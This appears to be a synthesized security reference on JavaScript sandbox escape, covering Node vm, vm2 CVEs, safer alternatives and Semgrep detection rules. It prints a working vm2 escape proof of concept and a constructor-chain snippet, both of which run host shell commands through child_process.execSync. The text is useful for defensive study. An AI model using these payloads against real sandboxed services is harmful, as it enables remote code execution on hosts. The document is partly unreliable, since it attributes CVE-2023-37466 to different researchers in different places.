# JavaScript Sandbox Escape — Primitives, Patterns, and Modern Alternatives
## Synthesized from Patrik Simek, XmiliaH, Seongil Wi, Takeshi Kaneko (arkark), Marcel Laverdet, Sven Slootweg (joepie91), Mike Pall, Filip Pizlo, and Kurt Boberg

> **Researchers:**
> - **Patrik Simek (@patriksimek)** — Original author and long-time maintainer of `vm2` (github.com/patriksimek/vm2). Designed the proxy-membrane architecture that distinguishes `vm2` from the bare Node `vm` module. In July 2023, after a series of unfixable architectural CVEs (CVE-2023-37466 the trigger), posted the discontinuation notice that became the textbook example of a maintainer publicly conceding the impossibility of his own threat model. The project was revived in late 2025 (the deprecation README text was quietly removed), which is the context for Kurt's CVE-2026-22709 disclosure landing in January 2026 — vm2 is officially dead, officially undead, and still installed everywhere.
> - **XmiliaH** — The single most prolific vm2-escape researcher; main contributor to vm2 up until the 2023 discontinuation. Reported the 2026 cluster CVE-2026-24118 (`__lookupGetter__` escape, CVSS 9.8), CVE-2026-24120 (Promise-`species` patch bypass), CVE-2026-24781, CVE-2026-44008/9, and others. XmiliaH's explanation of the deprecation: "The problems that piled up are caused by `node` intercepting calls from the sandbox ... and therefore arguments not being wrapped in a `Proxy`" — i.e., the bypass surface is not vm2's code but the V8/Node boundary vm2 cannot reach inside.
> - **Seongil Wi (seongil-wi)** — KAIST WSP Lab. Reporter of CVE-2023-29017 (`Error.prepareStackTrace` host-object leak via asynchronous error, the watershed pre-deprecation CVE), with a public PoC gist.
> - **Takeshi Kaneko (@arkark)** — GMO Cybersecurity by Ierae, Inc. Reporter of CVE-2023-32314 (vm2@3.9.17 sandbox escape) — proved that `prepareStackTrace`'s `err` argument is *not* proxied because the function is called directly by V8, so `err.name.toString` constructs `argArray` in the host context and hands the attacker the host-context `Function` constructor. The canonical "the JS engine itself is the bypass surface" finding.
> - **Marcel Laverdet (@laverdet)** — Author of `isolated-vm` (github.com/laverdet/isolated-vm), the V8-isolate-per-sandbox library that vm2's deprecation notice points to as the recommended successor. The reference implementation of "if you actually need to run untrusted JS in-process, this is the bar."
> - **Sven Slootweg (@joepie91 / Sven Slootweg)** — Long-running thread of npm/Node criticism. Maintains the blog at cryto.net/~joepie91.
> - **Mike Pall** — Author of LuaJIT. The canonical formulation of the "you cannot sandbox a fast language" thesis. From his LuaJIT FAQ: *"In general, the only promising approach is to sandbox Lua code at the process level and not the VM level."* The argument is not Lua-specific — every fast JIT compiler (LuaJIT, V8, JavaScriptCore, SpiderMonkey) builds and executes native machine code at runtime, and the resulting attack surface cannot be contained by in-process scoping tricks. The same reasoning applies one-for-one to JS sandboxing.
> - **Filip Pizlo (Apple WebKit/JavaScriptCore)** — Authored "What Spectre and Meltdown mean for WebKit" (Jan 2018), which lays out WebKit's Spectre mitigations (long-term: branchless security checks) and advises apps embedding WebKit to use the Modern WebKit API, which runs untrusted JavaScript in a separate process.
> - **Kurt Boberg (@lapt0r / GHSA reporter `kurt-r2c`)** — Staff Security Researcher at Semgrep. Reporter of **CVE-2026-22709** (vm2 promise-`catch` global-handler bypass, CVSS 9.8, January 2026). The "perfect deprecation-era CVE": vm2 was officially dead, was being un-deprecated, and still landed a 9.8 with a short PoC because the entire installed base had not moved. Documented at semgrep.dev/blog/2026/calling-back-to-vm2-and-escaping-sandbox.
>
> Sources: semgrep.dev/blog (2023 discontinuation + 2026 calling-back posts); github.com/patriksimek/vm2 advisories; security.snyk.io vm2 catalogue; CVE-2023-29017 / -30547 / -32314 / -37466 / 2026-22709 / -24118 / -24120 NVD entries; github.com/laverdet/isolated-vm README; cryto.net/~joepie91; luajit.org/faq.html; webkit.org/blog/8048/what-spectre-and-meltdown-mean-for-webkit/; nodejs.org/api/vm.html security notes; quickjs-ng/quickjs; wasmtime.dev.

---

## 1. The Fundamental Problem — Why "Run Untrusted JS In My Process" Is Structurally Hard

### The reach-out-of-the-sandbox primitive class

Every JavaScript sandbox-escape CVE — across `vm`, `vm2`, `safe-eval`, `sandboxjs`, and adjacent libraries — reduces to the same underlying primitive: **the sandboxed code obtains a reference to an object whose prototype chain reaches into the host realm.** Once such a reference exists, the chain is walkable, the constructor is reachable, and `Function.constructor("...")` in the host realm gives the attacker an arbitrary code-evaluation primitive with full Node module access.

The vulnerability class is structural rather than implementational. Cross-link to `prototype_pollution_expertise.md` §1 — every plain JavaScript object inherits from `Object.prototype`, every function has a `constructor` slot, every reference to a host-side object carries a path back to its host-side `Function` constructor. A sandbox that hands the guest *any* host-realm object — an error, a promise, a stack-trace frame, a TypedArray, a Proxy target — has to wrap that object in a membrane that intercepts every possible access (property reads, property writes, `Symbol.toPrimitive`, `Symbol.iterator`, `[[Get]]`, `[[Set]]`, `[[HasProperty]]`, `[[OwnPropertyKeys]]`, `[[GetPrototypeOf]]`, `[[SetPrototypeOf]]`, `[[Construct]]`, `[[Call]]`, `[[GetOwnProperty]]`, `[[DefineOwnProperty]]`, `[[PreventExtensions]]`, `[[IsExtensible]]`, `[[Delete]]`), for every object type the runtime defines, across every async boundary the runtime supports, *and across every future evolution of the language spec.* No sandbox in any non-trivial JS runtime has ever held this contract for more than ~12 months without a new escape CVE.

### Transparency of prototypes

The structural challenge is not "JavaScript has too many features." The structural challenge is that **JS prototypes are mutable, walkable, and unforgeable.** There is no way to hand out a JS object whose prototype the recipient cannot inspect. `Object.getPrototypeOf(x)` returns the prototype regardless of whether you wanted to share it. `x.__proto__` walks one step up the chain even on objects you tried to "freeze." `x.constructor` resolves to the constructor via prototype lookup unless you explicitly shadow `constructor` on the object — and then `Object.getPrototypeOf(x).constructor` still works. Every reference handed across the boundary is a graph-pointer into the host heap, traversable by any guest with the will to call `__lookupGetter__` (XmiliaH's CVE-2026-24118).

### Worked example: even an empty `{}` carries reach

Consider a "sandbox" that just calls `JSON.parse` on guest input and returns the result. The output is `{}`, an empty object — surely no host reach? But:

```js
const result = JSON.parse(guestInput);                                  // {} — host-realm Object
const HostFunctionConstructor = result.constructor.constructor;         // host-realm Function
new HostFunctionConstructor("process.mainModule.require('child_process').execSync('id')")();
```

The empty object is a *host-realm* object with a host-realm prototype chain. The guest may not have "received" anything dangerous, but the value's *type* crosses the boundary. This is the fundamental reason `vm.runInNewContext` and `JSON.parse` are not security primitives.

### The Node.js `vm` module documentation says so

The Node.js documentation has, since at least Node 8 (2017), carried this notice at the top of the `vm` module page:

> "The `node:vm` module is not a security mechanism. **Do not use it to run untrusted code.**"

The warning has been there since 2017. Every CVE in the vm2 corpus, structurally, is a consequence of a developer reading that warning and reasoning "OK so I'll use vm2 instead" without observing that vm2 layers over `vm` and inherits all of its boundaries.

### The "fast-language sandbox is impossible" argument (Mike Pall)

From LuaJIT's FAQ: *"In general, the only promising approach is to sandbox Lua code at the process level and not the VM level."* The reasoning generalizes one-for-one to JavaScript. A JIT compiler is a runtime native-code generator; the boundary between "code the language semantics allow" and "code the JIT emits" is the JIT's lowering rules — millions of lines of C++ that have to be exactly correct under every input the optimizer can construct. They are not. (Witness: every JavaScriptCore / V8 / SpiderMonkey Pwn2Own CVE since 2013.) Conclusion: **if your threat model includes "the guest is adversarial," the sandbox boundary must be a process, hypervisor, or Wasm-module boundary — not a `vm.createContext()` call.**

---

## 2. The Node `vm` Module — What It Actually Provides

### API surface

The Node `vm` module exposes three primary execution APIs:

- **`vm.runInThisContext(code, options)`** — Compiles and runs `code` in the *current* V8 context. The compiled script has access to global identifiers but *not* the current scope's local variables. This is the weakest possible boundary; it is approximately equivalent to `new Function(code)()`. Use cases: hot-reloading a config file you trust. Never use with untrusted input.
- **`vm.runInNewContext(code, sandbox, options)`** — Creates a *new* V8 context (a `vm.Context` object, internally a `v8::Context` with a separate global object), copies the supplied `sandbox` argument into that context's global, and executes. The new context shares the same V8 isolate as the caller — same heap, same garbage collector, same JIT. Cross-context references work in both directions.
- **`vm.runInContext(code, contextifiedSandbox, options)`** — Same as `runInNewContext` but reuses an already-contextified sandbox object.

### The "context" object

The crucial thing to understand about `vm.Context`: **it is not a process, not a thread, not an isolate.** It is a V8 *Realm* — a new global object with its own set of intrinsics (`Object`, `Array`, `Function`, `Promise`, etc.). Code running in the context sees the context's `Object` and `Function` constructors, not the caller's. But:

- The heap is shared.
- Cross-realm object references work transparently.
- Errors thrown across the boundary carry the throwing realm's prototype chain.
- Async operations (Promise resolutions, `setTimeout` callbacks, microtask queue drains) run with whichever realm's intrinsics the originating object came from.

This last bullet is the load-bearing one for sandbox-escape research. A `Promise` resolved across the boundary is *not* necessarily of the type the receiving realm expects. The microtask queue does not respect realm boundaries — it processes microtasks from all realms in the same isolate in a single ordered queue, with intrinsics inherited from the realm of the originating Promise. CVE-2026-22709 (Kurt's) and CVE-2023-37466 (XmiliaH's) both live in this gap.

### The `contextify` mechanism

When you pass a `sandbox` argument to `vm.runInNewContext`, Node calls `vm.createContext(sandbox)` internally (if it has not been contextified already). This binds the supplied object as the new context's global. Property reads on the new context's global proxy fall through to the sandbox object; writes to the sandbox object are visible from inside the context as global writes. **This bridging is the leakage point.** If the supplied sandbox contains any reference to a host-realm object — a `console`, a `setTimeout`, a `Buffer`, a `process`, a logging callback — the guest code can walk that reference's prototype chain to escape.

### The microtask queue boundary

By default, V8's microtask queue is *per-isolate*, not per-realm (Node's `vm` `microtaskMode: 'afterEvaluate'` gives a context its own microtask queue). When sandboxed code does `await somePromise`, the continuation is scheduled on the same isolate-wide queue. If `somePromise` was created in the host realm, the continuation runs with the host realm's intrinsics. Getting this right at the realm boundary requires either (a) a complete shim of every Promise primitive, or (b) running the guest in a separate isolate entirely.

vm2 chose (a). Every Promise-related vm2 CVE is a place where the shim missed a code path. There are more code paths than the maintainers have engineering time for; this is structural.

### Why the docs explicitly warn

Quoting Node.js docs (current at time of writing, May 2026):

> "The `node:vm` module is not a security mechanism. **Do not use it to run untrusted code.**"

This text is load-bearing. Anyone proposing to "just use `vm.createContext`" for an isolation boundary should be pointed to this paragraph, plus the CVE-2023-29017 / -32314 / -37466 / 2026-22709 cluster, before the conversation continues.

---

## 3. The vm2 / @vm2-org Lineage

### Design goal

`vm2` was Patrik Simek's answer to "the Node `vm` module isn't a security boundary, can we wrap it into one?" The architecture:

1. Run guest code in a `vm.Context` (the weak baseline).
2. Wrap *every* object handed across the boundary in a `Proxy` that intercepts every trap.
3. Maintain a bidirectional membrane: host-side objects entering the guest become `Proxy`-wrapped; guest-side objects entering the host get similarly wrapped on the way back.
4. Re-implement the V8/Node intrinsics that the guest sees (`Function`, `Promise`, `Error`, etc.) using sandbox-local versions, so the guest's `error.constructor` does not resolve to the host `Function`.

This is the right architecture *in theory*. It is the same architecture Caja used in the browser, the same architecture SES (Secure ECMAScript) uses in Agoric / endo. The difference between vm2 and SES is that SES restricts the language semantics it supports (no `Function.prototype.caller`, no `with` statement, no mutable globals) so the membrane's coverage requirement is bounded. vm2 promised the full language. **Promising the full language is the original sin.**

### Why this kept breaking

Every vm2 CVE is structurally the same shape: a code path was discovered where some object slipped across the membrane without being wrapped, or was wrapped but the wrapping was bypassable, or where the *V8 engine itself* invoked a callback with arguments that vm2's interception never got to see. Examples:

- **`Error.prepareStackTrace`** (CVE-2023-29017, seongil-wi): V8 calls this function when `.stack` is accessed. The call comes from inside V8's native stack-trace assembly code, *bypassing the proxy membrane.* The `error` argument is a host-realm `Error`. From inside `prepareStackTrace`, the guest has `error.constructor === host.Error`, then `error.constructor.constructor === host.Function`, then RCE.
- **Async function results** (CVE-2026-22709): `async () => {}` returns a `globalPromise`, not the sandbox's `localPromise`. The two have different prototype chains. Methods on `globalPromise.prototype` are reachable from the sandbox via `(async()=>{})().constructor`.
- **`Promise` constructor** (CVE-2023-37466, leesh3288): when an async stack unwinds through a `Promise` rejection handler not installed by sandbox code, the rejection callback runs with host intrinsics.
- **`__lookupGetter__`** (CVE-2026-24118, XmiliaH): the legacy `Object.prototype.__lookupGetter__` method returns the *getter function* defined on an object's prototype chain. Calling it on a sandboxed value returns the host-realm getter, which is callable.

The pattern repeats. Each CVE is "we forgot to sanitize this one type of object" — and each fix sanitizes that type, leaving the next-discovered type uncovered.

### The instructive CVE corpus

The most instructive vm2 CVEs, in chronological order, with the primitive type each one establishes:

| CVE | CVSS | Year | Primitive |
|---|---|---|---|
| CVE-2021-23449 | 9.8 | 2021 | Sandbox escape via prototype pollution |
| CVE-2022-36067 ("Sandbreak") | 10.0 | 2022 | `Error.prepareStackTrace` host-Error access |
| CVE-2023-29017 | 9.8 | 2023 | `Error.prepareStackTrace` *async* variant; `Symbol()` cast trick |
| CVE-2023-29199 | 9.8 | 2023 | Source-transformer bypass; `handleException()` leak |
| CVE-2023-30547 | 9.8 | 2023 | Host-thrown Error reaches guest |
| CVE-2023-32314 | 9.8 | 2023 | `prepareStackTrace` `argArray` not proxied (V8 native call) |
| CVE-2023-37466 | 9.8 | 2023 | `Promise` constructor / `globalPromise` reach — the deprecation trigger |
| CVE-2026-22709 (Kurt) | 9.8 | 2026 | Global promise catch handler sanitization gap |
| CVE-2026-24118 (XmiliaH) | 9.8 | 2026 | `__lookupGetter__` reach |
| CVE-2026-24120 (XmiliaH) | 9.8 | 2026 | `Promise` `species` property — patch bypass of CVE-2023-37466 |

Every entry is CVSS 9.8 or higher. The pattern is not a coincidence; **the lower bound on a vm2 sandbox escape is RCE-on-the-host — once the membrane is pierced, the host's full module-resolution surface is reachable.**

### The 2023 deprecation announcement

In July 2023, after CVE-2023-37466, Patrik Simek posted to the GitHub repository README:

> "The library contains critical security issues and should not be used for production!"

The recommended replacement was `isolated-vm`. Semgrep covered the deprecation in detail in `semgrep.dev/blog/2023/discontinuation-of-node-vm2/` ("The indomitable maintainer spirit versus the indifferent cruelty of JavaScript"). The post is worth reading in full as a writeup of *why* this was structurally necessary.

### Why projects still use it

The deprecation announcement did not delete the npm package: ~5.7M weekly downloads at deprecation, ~1M+ weekly two years later. Reasons projects do not move:

1. **Transitive dependency** — vm2 sits behind Discord-bot platforms, no-code builders, code-execution-as-a-service, low-code RPA, template renderers. Downstream consumers often do not know it is there.
2. **Build-system inertia** — replacing vm2 with isolated-vm requires switching from pure-JS to native-addon, which breaks Lambda deployments lacking the right glibc, Electron builds, and some serverless Worker isolates.
3. **API mismatch** — vm2 is "code + sandbox dict → result"; isolated-vm is "isolate + explicit transfers + registered host functions + memory/CPU budgets." Non-trivial cognitive jump.
4. **"We don't run untrusted code"** — many projects use vm2 for code authored by trusted users writing automation. That is exactly the threat model vm2 fails on (authenticated insider with crafted payload).

In late 2025 the project resumed releases (3.10.0, October 2025). The deprecation README text was quietly removed. This is the context CVE-2026-22709 lands into: vm2 is again "actively maintained," the underlying architectural problem is unchanged, the installed base is still ~1M weekly.

---

## 4. CVE-2026-22709 — Kurt's Anchor Case

The post at `semgrep.dev/blog/2026/calling-back-to-vm2-and-escaping-sandbox` documents Kurt's January 2026 disclosure. The synopsis:

### Primitive

vm2's `Promise` sanitizer wraps `.then` and `.catch` handlers in proxies that re-wrap any host-realm value before delivering it to guest code. The wrapping is implemented at the `localPromise.prototype` level — that is, on Promises constructed *inside* the sandbox's intrinsics. **The configuration for promise catch blocks had a fail-open case where this safeguard was not applied to global promise handlers** — i.e., handlers attached to `globalPromise`-typed values, which is the type returned by *async functions invoked from inside the sandbox.*

Quoting the post directly:

> "the configuration for promise catch blocks had a fail-open case where this safeguard was not applied to global promise handlers."

And on why this works:

> "A malicious user can specify a global promise exception handler by specifying an unscoped `promise.catch(...)` that JS will then hoist into the global scope, bypassing the local scope promise sanitizer."

### The minimum-payload exploit (Kurt's PoC, verbatim from the post)

```js
const { VM } = require("vm2");
const code = `
const error = new Error();
error.name = Symbol();
const f = async () => error.stack;
const promise = f();
promise.catch(e => {
    const Error = e.constructor;
    const Function = Error.constructor;
    const f = new Function(
        "process.mainModule.require('child_process').execSync('echo HELLO WORLD!', { stdio: 'inherit' })"
    );
    f();
});
`;
new VM().run(code);
```

The chain:

1. `new Error()` — a host-realm Error, vm2 wraps it for delivery to the guest.
2. `error.name = Symbol()` — assigns a non-string-coercible name. This is load-bearing: when `error.stack` is later accessed, V8's stack-frame assembler calls `String(error.name)`, which calls `Symbol.prototype.toString` *but* the implicit-coerce path throws `TypeError` because Symbols don't auto-coerce.
3. `const f = async () => error.stack;` — wraps the `.stack` access in an `async` function. Async functions return `globalPromise`, not the sandbox's `localPromise`.
4. `f()` — invokes the async function. Internally, V8 evaluates `error.stack`, which calls into `Error.prepareStackTrace` machinery, which throws because of the Symbol-name coercion. The throw rejects the `globalPromise` returned from `f()`.
5. `promise.catch(e => ...)` — attaches a catch handler. **Because `promise` is a `globalPromise`, not a `localPromise`, vm2's promise sanitizer does not wrap the catch handler.** The catch handler receives the raw host-realm `TypeError`.
6. Inside the catch handler: `e.constructor` is host-realm `TypeError`; `e.constructor.constructor` is host-realm `Function`; `new host.Function("process.mainModule.require(...).execSync(...)")` constructs and immediately executes the payload in the host realm.

### Why this is the "perfect deprecation-era CVE"

vm2 was officially deprecated in 2023. It resumed releases in late 2025. The community message in 2023 was "stop using this." The community message in 2025 was "actually we're maintaining it again." The community message implicit in CVE-2026-22709 is **"the architectural problem the deprecation was about hasn't gone away; the un-archiving was social, not technical."**

The CVSS-9.8 lands because:

- **Huge installed base** — ~1M weekly downloads at disclosure, including transitive dependencies in commercial products.
- **Trivial PoC** — about a dozen lines of code, no exotic prerequisites.
- **Universal applicability** — every codebase that takes user-supplied JavaScript and runs it through `vm2.VM` or `vm2.NodeVM` is affected, regardless of what they think they're sandboxing.
- **Patch is single-point fixup** — Kurt's variant is closed in 3.10.2, but the *class* of bugs (global-Promise vs local-Promise distinction) was already closed once before (CVE-2023-37466 fix) and re-opened (CVE-2026-24120 demonstrates a parallel re-open via `Promise[Symbol.species]`). The fix is a fix; it is not a structural defense.

### Variant analysis implications

Cross-link to `vulnerability_research_methodology_expertise.md` §2 (variant analysis). The CVE-2026-22709 finding implies a class of primitives:

- **Every place vm2 wraps `localPromise.prototype.X` but does not wrap `globalPromise.prototype.X`** is a candidate. The patch closes catch; what about `then`? What about `finally`? What about the various PromiseAggregator combinators (`Promise.all`, `Promise.allSettled`, `Promise.any`, `Promise.race`)?
- **Every place V8 invokes a JS function from native code without going through the proxy membrane** is a candidate. `Error.prepareStackTrace` is one. `Symbol.toPrimitive` is another. `Symbol.iterator` is another. The full list is in the V8 source.
- **Every place the language spec adds a new well-known Symbol or a new intrinsic** is a future candidate. Each ES proposal that lands in V8 expands the membrane's coverage requirement; vm2 has to catch up reactively.

CVE-2026-24120 (XmiliaH, May 2026) demonstrates that the second bullet pays off — the `Promise[Symbol.species]` bypass is precisely the variant of CVE-2023-37466 that re-opens the same class through a different intrinsic. The variant tree under CVE-2026-22709 is unfinished.

---

## 5. Alternative Sandboxes — isolated-vm, QuickJS, Workers

### isolated-vm (Marcel Laverdet)

`isolated-vm` uses a *separate V8 isolate per sandbox.* A V8 *isolate* is a complete VM instance — separate heap, JIT code cache, microtask queue, intrinsics — with no cross-isolate references. A V8 *context* (what `vm.runInNewContext` creates) shares the isolate with its parent; an isolate does not. In isolated-vm, the guest cannot reach the host's prototype chain because the host's prototypes live in a different heap. To escape, the guest needs a V8 type-confusion bug (Pwn2Own-grade) or an isolated-vm bridge bug.

Cost: every host-guest call pays a marshalling cost. Primitives copy by value; objects transfer as `Reference` handles, and each property access on a `Reference` is a cross-isolate call. The code reads more like RPC than in-process — the right tradeoff for the security gain. Used in production by Screeps, Fly, Algolia, Tripadvisor, and others. In maintenance mode as of 2025 but architecturally sound.

### QuickJS / quickjs-emscripten

QuickJS (Fabrice Bellard) is a complete ECMAScript engine in just a few C files, small enough to compile to Wasm. When QuickJS-on-Wasm runs in `wasmtime` / `wasmer`, the sandbox has *two* boundaries: QuickJS's own runtime-to-host isolation, plus the Wasm boundary itself (hardware-enforced, capability-typed imports). `quickjs-emscripten` packages this with a JS API. Used in production by Figma.

Cost: slower than V8 on most benchmarks. Invisible for "run a 100-line user script in a serverless function"; matters for heavy data-transformation. This is the modern recommendation for new builds where security is dominant: **compile QuickJS to Wasm, run in wasmtime, expose host functions via WASI's capability model.**

### safe-eval, vm2-process, "sandbox" libraries

**Any npm package whose README contains "secure sandbox" / "safe eval" / "isolated execution" should be treated as marketing, not as a property.** Track record: `safe-eval` (multiple CVEs, unmaintained); `vm2` (covered); the `sandbox` package (real child_process boundary, large IPC surface with disclosed parsing bugs); `js-sandbox` / `mini-sandbox` (`new Function(code)` with pre-processing — not boundaries). A sandbox claim is only credible when it ships with a published threat model and a public bug-bounty program. isolated-vm and QuickJS-in-Wasm clear this bar. Nothing else in the npm ecosystem does.

### Deno's Worker model

Deno takes a fundamentally different approach: permissions are first-class to the runtime. A Deno script does not have file-system access unless it was started with `--allow-read`. A Deno script does not have network access unless it was started with `--allow-net`. The granularity extends to specific paths and specific hosts.

For "run a user-supplied Deno script," the recommended pattern is:

1. Run the guest in a `Worker` (`new Worker(url, { type: "module", deno: { permissions: { ... } } })`).
2. Set permissions to the minimum required for the guest's expected job.
3. Communicate via `postMessage` — explicit, serialized, no shared references.

This is structurally similar to "compile to Wasm and run in wasmtime" — it relies on the runtime enforcing a capability model, with no in-process shared-object reach. Deno's threat model is good. The catch: this only works for code that has been written *for* Deno. Migrating a node-vm2-using codebase to Deno Workers is a significant rewrite.

### The "no module imports from sandbox" discipline

Regardless of which sandbox you choose, **allowing the guest to call `require()` / `import()` undoes the boundary.** A guest that can load `child_process` (or `node:child_process`, or `fs`, or `net`, or `dgram`, or any FFI-shaped module) does not need a sandbox escape — it has been handed RCE intentionally.

vm2's `NodeVM` constructor offers a `require` configuration:

```js
const vm = new NodeVM({ require: { external: true, builtin: ['fs'] } });
```

Any setting other than `require: false` is, in effect, an explicit security capability grant. If you are exposing modules to the guest, you have moved your threat model from "guest is fully sandboxed" to "guest has these specific capabilities." This is reasonable; what is *not* reasonable is granting access to `fs`, `child_process`, `vm`, `net`, or `process` while telling the guest "you're sandboxed."

The same discipline applies to isolated-vm: the host can register functions that the guest can call. Every such function is a capability grant. The set of registered functions *is* the threat model.

---

## 6. Browser Sandbox Escape — Adjacent But Distinct

### The renderer-process boundary

Modern browser engines run web content in *renderer processes* isolated from the *browser process* by OS-level boundaries — Seatbelt profiles on macOS, seccomp-bpf + user namespaces via the SUID `chrome-sandbox` helper on Linux, integrity-level downgrade + Job objects + AppContainer on Windows. Renderer-to-browser IPC goes through Chrome's `mojo`, Safari's `XPC`, or Firefox's `IPDL`.

Escape from a malicious web page to OS code execution requires *two* bugs chained: (1) a V8 / JavaScriptCore / SpiderMonkey type-confusion bug to break out of the JS VM into renderer-process native code, plus (2) a sandbox-policy or IPC bug to break out of the renderer. Pwn2Own contestants chain these explicitly. A single V8 bug is "renderer RCE" (bad but contained); V8 + sandbox is "host RCE" (worth the prize).

### Type confusion in V8 and the "fast JIT" argument

V8 type-confusion bugs are a *class*, structurally reducing to "the JIT's type-inference rules disagreed with the runtime's type checks under a specific code shape, yielding a memory access where the size-of-object the JIT thought it had differed from the actual size." From there, arbitrary read/write of renderer memory; from there, native RCE.

Filip Pizlo's "What Spectre and Meltdown Mean for WebKit" (webkit.org/blog/8048, Jan 2018) is the canonical engineering writeup on why even *correctly implemented* speculative JITs leak across security boundaries, and recommends that apps embedding WebKit run untrusted JavaScript in a separate process via the Modern WebKit API. Cross-link to `cryptography_expertise.md` for the side-channel primitives.

### iframe sandbox attribute, service workers, extensions

The HTML `<iframe sandbox>` attribute is *defense-in-depth* against same-page DOM/script reach, not a renderer-process boundary. Gotcha: `sandbox="allow-scripts allow-same-origin"` is not a sandbox at all — the framed content can `frameElement.removeAttribute('sandbox')` and reload. Cross-link to `http_web_security.md` §iframes for the complete attribute matrix.

Service workers are *scoping*, not security boundaries — same renderer process as the registering page. Extension content scripts run in an "isolated world" (separate `window`, shared DOM) inside the page's renderer; the background script runs in a separate renderer process with extension permissions. Isolated-world is renderer-enforced (breaks on a renderer bug); background-script is browser-process-enforced (breaks on IPC bug).

For LLM-agent browser tooling (Claude Code's web browsing, ChatGPT's browser-use), cross-link to `llm_agent_security_expertise.md` §browser-tool-runtime — these execute pages in either headless Chromium (full renderer attack surface) or DOM-only fetchers (limited surface, limited fidelity).

---

## 7. WebAssembly as the Structural Alternative

### Memory isolation by construction

WebAssembly modules execute against a *linear memory* — a contiguous byte buffer owned by the module — and cannot access any memory outside that buffer except through *imported functions* provided by the host. The linear memory is sized at module instantiation and accessible only by the module's own instructions (`memory.load`, `memory.store`). This is enforced by the Wasm runtime; the module's machine code is JIT-compiled with bounds checks on every memory access (or hardware-accelerated guard-page tricks on 64-bit hosts).

The implication: a Wasm module cannot reach into host memory, cannot call native code unless the host explicitly imports a function for it, and cannot inspect the host's stack. The boundary is *architectural* — not "we wrote a careful proxy membrane" but "the machine instructions cannot express the bad operation."

### WASI capability model

The WebAssembly System Interface (WASI) is the capability-typed standard library for Wasm-targeted host environments. The relevant property: WASI does not expose "open this file" as a free-floating syscall. Instead, the module receives a *preopened directory handle* (`fd`), and `path_open` operations are relative to that handle. The module cannot open a file outside the preopened directory tree because it cannot construct the necessary handle out of thin air.

This is the same capability discipline that POLA (principle of least authority) systems like Genode, seL4, and Capsicum use. The host decides what the guest can do *before* the guest runs, by passing capability handles into the module's instantiation. The guest can only do what the handed-in capabilities allow. Cross-link to `agentic_web_capabilities_expertise.md` (sibling agent's doc — assume it exists at write time) for the broader capability-system discussion.

### "Compile DSL to Wasm" as the durable answer

For the canonical "I want users to run untrusted code in my product" problem, the architecturally-correct 2026 answer:

1. Define a DSL — restricted language with a well-defined surface, not full JS.
2. Compile to Wasm (or use Rust / AssemblyScript / Grain / Go-with-wasmgo).
3. Run in `wasmtime`, `wasmer`, or `WasmEdge`.
4. Expose host capabilities explicitly via WASI or `wit-bindgen` bindings.

In production at Cloudflare Workers (Wasm path), Fastly Compute@Edge, Shopify Functions, Vercel Edge, Fermyon Spin. Durable, inspectable, regulator-defensible.

### Limitations

Wasm-based sandboxing is not a panacea:

- **Side channels** — Spectre-class timing attacks still apply unless the runtime takes explicit countermeasures (wasmtime does; not all do). Cross-link to `cryptography_expertise.md` §side-channels.
- **Resource exhaustion** — Wasm modules can burn CPU and memory; runtime must enforce *fuel limits* and memory caps. Cross-link to `redos_algorithmic_dos_expertise.md`.
- **Host function trust** — every imported function is a capability. A buggy host function (e.g., reflects a string pointer without bounds-checking) is host-side memory corruption *triggered from the sandbox.*
- **Compilation toolchain trust** — if the guest is attacker-supplied Wasm bytecode, the runtime must validate it; if the guest is source-the-host-compiles, the compiler is in the trusted base.

The Wasm approach moves the bar from "we wrote a JS proxy membrane" to "we trust the Wasm runtime + WASI + our imported functions." A much smaller and more inspectable trusted base than V8+vm2.

---

## 8. Detection — Static Analysis Lens

### Sink catalog

Cross-link to `semgrep_rule_authoring.md` for rule structure. The sinks for the JS-sandbox-escape rule class are:

**Always-flag (CRITICAL severity by default — the patterns are structurally insecure regardless of context):**

- `eval(...)` with any non-string-literal argument
- `new Function(arg1, ...)` with any non-string-literal `arg1` (the body)
- `vm.runInThisContext(...)` with a non-string-literal argument
- `vm.runInNewContext(code, sandbox, ...)` where `sandbox` is not the literal `Object.create(null)` or `{}` (the literal-`{}` case is also weak but at least has the smallest reach)
- `require('vm2').VM`, `require('vm2').NodeVM`, `require('vm2').VMScript` — any use; vm2 is structurally insecure (CVE-2026-22709 was followed by a dozen more critical CVEs disclosed in May 2026)
- `require('safe-eval')` — any use; bypassed, no patched version
- `Function.prototype.constructor` access on any value that reached the current scope from a sandbox boundary

**Source enrichment (HIGH when these reach a sink above):**

- `req.body`, `req.query`, `req.params` (Express / Fastify / Koa)
- `ctx.request.body` (Koa)
- `event.body` (Lambda / serverless)
- `process.argv[...]` for CLI inputs
- File contents read from user-writable directories
- Database queries returning user-controlled strings into code-eval positions

### Semgrep rule shapes

For a `vm2` deprecation rule, the minimum-viable shape:

```yaml
rules:
  - id: javascript.security.vm2.use-of-vm2
    message: |
      vm2 is structurally insecure and has been the subject of 15+ CVSS-9.8
      sandbox-escape CVEs (including CVE-2026-22709). The library was
      deprecated by its maintainer in 2023; the late-2025 un-deprecation does
      not address the underlying architectural problem. Migrate to
      isolated-vm, QuickJS-in-Wasm, or out-of-process workers.
    severity: ERROR
    languages: [javascript, typescript]
    pattern-either:
      - pattern: require('vm2')
      - pattern: |
          import ... from 'vm2'
      - pattern: |
          import 'vm2'
    metadata:
      cwe: "CWE-913"
      owasp: A05:2021
      references:
        - https://semgrep.dev/blog/2026/calling-back-to-vm2-and-escaping-sandbox
```

For a `vm.runInContext` review-required rule:

```yaml
rules:
  - id: javascript.security.node-vm.run-in-context-with-sandbox
    message: |
      vm.runInContext / runInNewContext is not a security boundary
      (Node docs: "The node:vm module is not a security mechanism").
      Passing a sandbox object with any host-realm references gives
      guest code reachable paths back to host intrinsics. If you
      need a real security boundary, use isolated-vm or run guest
      code in a separate process / Wasm module.
    severity: WARNING
    languages: [javascript, typescript]
    pattern-either:
      - pattern: vm.runInContext($CODE, $SANDBOX, ...)
      - pattern: vm.runInNewContext($CODE, $SANDBOX, ...)
    pattern-not-either:
      - pattern: vm.runInNewContext($CODE, Object.create(null), ...)
      - pattern: vm.runInNewContext($CODE, {}, ...)
    metadata:
      cwe: "CWE-913"
```

For an `eval`-with-user-input rule (taint-mode):

```yaml
rules:
  - id: javascript.security.eval-with-user-input
    mode: taint
    severity: ERROR
    languages: [javascript, typescript]
    pattern-sources:
      - patterns:
          - pattern-either:
              - pattern: $REQ.body
              - pattern: $REQ.query
              - pattern: $REQ.params
              - pattern: $EVENT.body
              - pattern: process.argv[$N]
    pattern-sinks:
      - patterns:
          - pattern-either:
              - pattern: eval($X)
              - pattern: new Function($X, ...)
              - pattern: vm.runInThisContext($X)
              - pattern: (new VM()).run($X)
